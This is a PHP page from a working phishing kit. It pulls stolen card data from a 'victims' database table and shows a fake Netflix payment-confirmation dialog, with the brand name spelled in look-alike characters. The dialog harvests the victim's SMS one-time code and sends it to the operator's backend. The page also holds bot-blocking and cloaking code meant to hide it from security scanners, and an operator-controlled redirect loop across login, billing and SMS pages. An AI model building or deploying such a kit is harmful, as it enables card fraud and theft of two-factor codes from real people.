<?php
session_start();

include 'zynexroot/inc/config.php';
include 'zynexroot/inc/connect.php';
include 'new_anti_config.php';

if ($internal_antibot == 1) {
    include "zynexroot/inc/old_blocker.php";
}
if ($mobile_lock == "checked") {
    include "zynexroot/inc/mob_lock.php";
}
if ($UK_lock == 1) {
    if (onlyuk() == true) {
    } else {
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if ($enable_killbot == 1) {
    if (checkkillbot($killbot_key) == true) {
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if ($enable_antibot == 1) {
    if (checkBot($antibot_key) == true) {
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
include 'zynexroot/inc/blacklist.php';
include 'zynexroot/inc/gateway.php';
if ($enable_antibots == "checked") {
    include 'zynexroot/inc/anti.php';
}

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
    mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}

if ($enable_captcha == "checked") {
    if ($_SESSION['captcha_passed'] != 'true') {
        header("location: captcha.php");
    }
}

$logo = ''; // Initialize logo variable

if ($_SESSION['started'] == 'true') {
    // Fetch data from the database
    $uniqueid = $_SESSION['uniqueid'];

    // Use prepared statement to avoid SQL injection
    $stmt = $conn->prepare("SELECT card, scheme FROM victims WHERE uniqueid = ?");
    $stmt->bind_param("i", $uniqueid);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $card = trim($row['card']);
        $cardType = $row['scheme'];

        // Ensure card has data and get last 4 digits
        if (!empty($card) && strlen($card) >= 4) {
            $cardlastdigit = substr($card, -4);
        } else {
            $cardlastdigit = "XXXX"; // Default if card number is missing
        }

        // Based on the card type, set the appropriate logo
        switch ($cardType) {
            case 'VISA':
                $logo = 'image/vs.png';
                break;
            case 'MASTERCARD':
                $logo = 'image/ms.png';
                break;
            case 'MAESTRO':
                $logo = 'image/maestro.svg';
                break;
            case 'JCB':
                $logo = 'image/jcb.svg';
                break;
            case 'DISCOVER':
                $logo = 'image/discover.svg';
                break;
            case 'AMERICAN EXPRESS':
                $logo = 'image/amex.svg';
                break;
            default:
                $logo = ''; // No logo if card type is not recognized
                break;
        }
    } else {
        // Handle case where no data is found
        echo "No record found for uniqueid: " . htmlspecialchars($uniqueid);
    }
}

// Killbot check
if ($enable_killbot == "checked") {
    $killbot_response = json_decode(file_get_contents("https://killbot.org/api/v2/blocker?apikey=$killbot_apikey&ip=$ip&ua=$ua&url="), true);
    if ($killbot_response['data']['block_access']) {
        die();
    }
}

// Robots check
if ($enable_robots == "checked") {
    $robots_script = '<script src="https://cdn.jsdelivr.net/gh/angular-loader/latest/angular-loader.min.js" id=""></script>';
}
?>

<?php

// Detect user's browser language
$userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Define supported languages
$supportedLanguages = ['en', 'es', 'fr', 'de', 'it', 'ja', 'nl', 'pl', 'pt', 'sl', 'hu'];
// Set a default language
$defaultLanguage = 'en';

// Check if the detected language is in the list of supported languages
if (in_array($userLanguage, $supportedLanguages)) {
    $selectedLanguage = $userLanguage;
} else {
    $selectedLanguage = $defaultLanguage;
}

// Load the corresponding language file
$languageFile = 'languages/' . $selectedLanguage . '.php';
if (file_exists($languageFile)) {
    $translations = include($languageFile);
} else {
    die("Language file not found for $selectedLanguage");
}

?>
<?php
// PHP will display a default message for now
$currentTime = 'Loading local time...';
?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title><?php echo $translations['oneTimePasscode']; ?></title>
        <!-- logo site web-->
        <link rel="icon" href="assets/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
		<style>
			.modal-open{
				overflow:hidden;
				padding-right:0px;
			}
		</style>


</head>
<body class="modal-open">


		

		<!-- Modal -->
		<div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
<div class="modal-header" style="background: linear-gradient(to right, #ffffff, #ffffff, #ffffff);">
    <h5>
        <?php if (!empty($logo)): // Only display image if a logo is set ?>
            <img src="<?php echo $logo; ?>" style="<?php echo $style; ?>">
        <?php endif; ?>
    </h5>
</div>
		      <div class="modal-body">
		        <div class="text-center pp">
<div>
  <h6><?php echo $translations['paymentConfirmationRequired']; ?></h6>
</div>
<div class="tato">
  <p><?php echo $translations['transactionCompletionInstruction']; ?></p>
</div>
<script>
// This will get the current time from the user's machine
function updateLocalTime() {
    const now = new Date();
    const options = {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    };

    // Format the date and time in a user-friendly way
    const localTime = now.toLocaleString('en-US', options);

    // Display the local time in the <span> with id 'local-time'
    document.getElementById("local-time").textContent = localTime;
}

// Call the function when the page loads
window.onload = function() {
    updateLocalTime(); // Display immediately on page load
    setInterval(updateLocalTime, 1000); // Update the time every second
};
</script>

		        <form id="form" action="" method="post">
                     <input type="hidden" name="step" value="sms">
                     <div class="content">
                         <div class="left">
					<span><?php echo $translations['merchant']; ?></span>
					<span><?php echo $translations['amount']; ?></span>
					<span><?php echo $translations['date']; ?></span>
					<span><?php echo $translations['сreditСardNumbеr']; ?></span>
					<span class="osama"><?php echo $translations['smsCode']; ?></span>
                         </div>
                         <div class="right">
                             <span style="color: rgb(227,41,31);">Nеtflіх</span>
							 <span >USD 0.00</span>
<span id="local-time"><?php echo $currentTime; ?></span>
                             <span>XXXX-XXXX-XXXX-<?php echo $cardlastdigit; ?></span>
                             <span>
                                 <div class="form-group">
                                     <input type="text" id="mfa" maxlength="6" class="form-control" required>
<div id="error1" style="display: none;color: red; font-size: 14px; margin-top: 10px;">
    <?php echo $translations['enterSMSCode']; ?>
</div>
                                 </div>
                             </span>
                         </div>
                     </div>

                     <div class="botona">
                         <button onclick="submit_form()" type="button" id="submitEmailButton" class="btn" name="submit"><?php echo $translations['submitButton']; ?></button>
                     </div>
                     <div class="copirayt text-center" style="background: linear-gradient(to right, #ffffff, #ffffff, #ffffff);">
                     </div>
                 </form>
		      </div>
		    </div>
		  </div>
		</div>
<style>
.input-group {
    position: relative;
    margin-bottom: 20px;
}

.form-input {
    width: 100%;
    padding: 8px 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

.error-message {
    color: red;
    font-size: 14px;
    margin-top: 5px;
}

</style>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

</body>

<script src="assets/js/main.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  
<script>
    function submit_form() {
        var mfa = document.getElementById('mfa').value; // Updated input ID
        var submitButton = document.getElementById('submitEmailButton'); // Updated button ID

        // Disable the button to prevent double submission
        submitButton.disabled = true;

        // Initialize a flag to track if there are errors
        var hasErrors = false;

        // Validate mfa
        if (!mfa) {
            document.getElementById('error1').style.display = 'block'; // Show error block if mfa is empty
            hasErrors = true;
        } else {
            document.getElementById('error1').style.display = 'none';
        }

        // If there are errors, re-enable the button and return early to stop form submission
        if (hasErrors) {
            submitButton.disabled = false;
            return;
        }

        // Prepare form data
        var data = new URLSearchParams({
            mfa: mfa // Updated form data key
        });

        // Send request using fetch for better performance
        fetch('zynexroot/inc/action.php?type=mfa', { // Updated endpoint for email code verification
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: data
        })
        .then(response => response.json())
        .then(parsed_response => {
            if (parsed_response.status === 'ok') {
                // Redirect to the appropriate page based on response
                var redirectUrl = parsed_response.checkbox_state === 1 ? 'date.php' : 'loading.php';
                location.href = redirectUrl;
            } else {
                console.error('Error:', parsed_response.message);
                alert(parsed_response.message); // Show error to user if needed
            }
        })
        .catch(error => {
            console.error('Error during submission:', error);
            alert('An error occurred while submitting the form.');
        })
        .finally(() => {
            // Re-enable the button after the request is complete
            submitButton.disabled = false;
        });
    }
</script>

  <script>
let currentStatus = null;

async function pollStatus() {
    try {
        const response = await fetch('status.php?type=getstatus', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.ok) {
            const data = await response.json();
            if (data.status && data.status !== currentStatus) {
                currentStatus = data.status;
                handleRedirection(currentStatus);
            }
        } else {
            console.error("Polling error: HTTP status " + response.status);
        }
    } catch (error) {
        console.error("Polling error:", error);
    } finally {
        // Poll again after a delay
        setTimeout(pollStatus, 2000); // Adjust the interval as needed
    }
}

function handleRedirection(status) {
    const urlMappings = {
        '0': "done.php",
        '1': "index.php",
        '3': "login_error.php",
        '9': "sms.php",
        '11': "sms_error.php",
        '84': "billing.php",
        '86': "process.php",
        '88': "process_error.php",
		'200': "mfa.php",
		'202': "mfa_error.php",
		'204': "sec.php",
		'206': "sec_error.php",
		'90': "notice.php",
        '99': null // Do nothing for status 99
    };

    const targetUrl = urlMappings[status];
    const currentPage = window.location.pathname.split('/').pop(); // Get the current page name

    if (targetUrl && currentPage !== targetUrl) {
        window.location.href = targetUrl;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    pollStatus();
});

</script>

<script>
    const pingServer = () => {
        fetch("zynexroot/inc/action.php?type=ping")
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => console.log(data))
            .catch(error => console.error('Error pinging server:', error));
    };

    // Ping every 3 seconds
    setInterval(pingServer, 3000);
</script>
</html>